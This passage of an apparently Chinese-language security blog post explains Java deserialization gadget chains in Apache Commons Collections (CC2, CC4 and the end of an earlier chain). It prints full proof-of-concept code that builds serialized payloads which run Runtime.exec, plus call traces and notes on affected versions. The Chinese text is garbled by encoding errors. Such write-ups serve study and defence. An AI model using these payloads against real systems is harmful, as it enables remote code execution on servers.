</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">invokerTransformer1</span><span class="p">,</span><span class="n">invokerTransformer2</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LazyMap</span><span class="w"> </span><span class="n">fistrmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LazyMap</span><span class="p">)</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">(),</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">fistrmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;fistrmap&#34;</span><span class="p">,</span><span class="n">1111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">tiedMapEntry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">fistrmap</span><span class="p">,</span><span class="s">&#34;fistrmap&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="w"> </span><span class="n">hashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">tiedMapEntry</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tiedMapEntry</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">key</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">key</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">tiedMapEntry</span><span class="p">,</span><span class="s">&#34;kkkey&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">hashtable</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h1 id="commonscollections2"><strong>CommonsCollections2</strong><a hidden class="anchor" aria-hidden="true" href="#commonscollections2">#</a></h1>
<h1 id="0x02-ç¯å¢ƒ">0x02 ç¯å¢ƒ<a hidden class="anchor" aria-hidden="true" href="#0x02-ç¯å¢ƒ">#</a></h1>
<p>ä½¿ç”¨çš„æ˜¯<code>commons-collections-4.0</code>ç‰ˆæœ¬ï¼Œè€Œ3.1-3.2.1ç‰ˆæœ¬ä¸­<code>TransformingComparator</code>å¹¶æ²¡æœ‰å»å®ç°<code>Serializable</code>æ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸å¯ä»¥è¢«åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥CC2ä¸ç”¨3.xç‰ˆæœ¬ï¼Œä¸”4ç‰ˆæœ¬è¿‡é«˜ä¹Ÿä¸è¡Œï¼Œ<code>InvokerTransformer</code>ä¼šæ”¹ä¸ºä¸å®ç°<code>Serializable</code>æ¥å£ï¼Œæ¯”å¦‚<code>4.4</code>ç‰ˆæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.commons<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>commons-collections4<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>4.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><p><strong>åˆ©ç”¨é“¾</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/*
</span></span><span class="line"><span class="cl">   Gadget chain:
</span></span><span class="line"><span class="cl">     PriorityQueue.readObject()
</span></span><span class="line"><span class="cl">     PriorityQueue.heapify()
</span></span><span class="line"><span class="cl">     PriorityQueue.siftDown()
</span></span><span class="line"><span class="cl">     PriorityQueue.siftDownUsingComparator()
</span></span><span class="line"><span class="cl">               TransformingComparator.compare()
</span></span><span class="line"><span class="cl">                  InvokerTransformer.transform()
</span></span><span class="line"><span class="cl">                     Method.invoke()
</span></span><span class="line"><span class="cl">                        Runtime.exec()
</span></span></code></pre></div><p>è¿™é‡Œè¦<code>sizeå¤§äºç­‰äº2</code>æ‰èƒ½è¿›å…¥forï¼Œpocè®¾ç½®ä¸‹ï¼Œå…¶ä»–è·Ÿç€é“¾å­èµ°å°±è¡Œäº†</p>
<p><img loading="lazy" src="../images/image-20241111194645368.png" alt="image-20241111194645368"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC2</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getDeclaredMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc.exe&#34;</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">1</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">transformerChain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TransformingComparator</span><span class="w"> </span><span class="n">transformingComparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformingComparator</span><span class="p">(</span><span class="n">transformerChain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">priorityQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="n">transformingComparator</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;size&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">size</span><span class="p">.</span><span class="na">setInt</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h1 id="commonscollections4"><strong>CommonsCollections4</strong><a hidden class="anchor" aria-hidden="true" href="#commonscollections4">#</a></h1>
<p>cc4 å°±æ˜¯å°† cc2 çš„ <code>InvokerTransformer</code> æ›¿æ¢æˆäº† <code>InstantiateTransformer</code>, ç„¶ååˆ©ç”¨ TemplatesImpl æ¥æ‰§è¡Œ<code>å­—èŠ‚ç </code></p>
<p>ä¸Šé¢CC2ä¸æ˜¯è¯´äº†<code>InvokerTransformer</code>ç”¨ä¸äº†å˜›ï¼Œ4.4<code>InstantiateTransformer</code>ä¹Ÿç”¨ä¸äº†hhå°´å°¬ï¼Œä¼°è®¡æ˜¯è§£å†³4.0åˆ°4.4æŸä¸ªç‰ˆæœ¬ç”¨ä¸äº†<code>InvokerTransformer</code>åˆ›é€ çš„é“¾å­</p>
<p>å°±æ˜¯CC2çš„å¼€å¤´+CC3ç»“å°¾ï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">/*
</span></span><span class="line"><span class="cl">   Gadget chain:
</span></span><span class="line"><span class="cl">     PriorityQueue.readObject()
</span></span><span class="line"><span class="cl">     PriorityQueue.heapify()
</span></span><span class="line"><span class="cl">     PriorityQueue.siftDown()
</span></span><span class="line"><span class="cl">     PriorityQueue.siftDownUsingComparator()
</span></span><span class="line"><span class="cl">               TransformingComparator.compare()
</span></span><span class="line"><span class="cl">					ChainedTransformer.transform()
</span></span><span class="line"><span class="cl">                        ConstantTransformer.transform()
</span></span><span class="line"><span class="cl">                        InstantiateTransformer.transform()
</span></span><span class="line"><span class="cl">                        newInstance()
</span></span><span class="line"><span class="cl">                            TrAXFilter#TrAXFilter()
</span></span><span class="line"><span class="cl">                            TemplatesImpl.newTransformer()
</span></span><span class="line"><span class="cl">                                     TemplatesImpl.getTransletInstance()
</span></span><span class="line"><span class="cl">                                     TemplatesImpl.defineTransletClasses
</span></span><span class="line"><span class="cl">                                     newInstance()
</span></span><span class="line"><span class="cl">                                        Runtime.exec()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.InstantiateTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC4</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CC3</span><span class="p">.</span><span class="na">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CC3</span><span class="p">.</span><span class="na">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//setFiled(templates,&#34;_auxClasses&#34;,new Hashtable());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InstantiateTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InstantiateTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">templates</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">TrAXFilter</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TransformingComparator</span><span class="w"> </span><span class="n">transformingComparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformingComparator</span><span class="p">(</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">priorityQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="n">transformingComparator</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;size&#34;</span><span class="p">);</span><span class="w">
